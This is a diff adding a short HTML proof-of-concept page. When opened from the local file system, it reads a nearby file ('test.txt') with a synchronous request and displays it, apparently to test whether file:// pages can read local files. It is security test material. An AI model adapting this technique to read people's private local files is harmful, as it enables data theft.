@@ -1,0 +1,28 @@
+<html>
+<head>
+    <title>POC</title>
+
+</head>
+<body>
+    <textarea style="width: 500px; height: 400px;" id="files"></textarea>
+
+    <script type="application/javascript">
+        var file = (q) => {
+            try {
+                var oReq = new XMLHttpRequest()
+                oReq.addEventListener("load", function(e) {
+                    console.dir(e)
+                })
+                oReq.open("GET", q, false);
+                oReq.send();
+            } catch (e) {
+                document.title = 'failed'
+            };
+            return oReq.response;
+        };
+        if (location.protocol == 'file:') {
+            document.querySelector('textarea').value = file('test.txt');
+        }
+    </script>
+</body>
+</html>
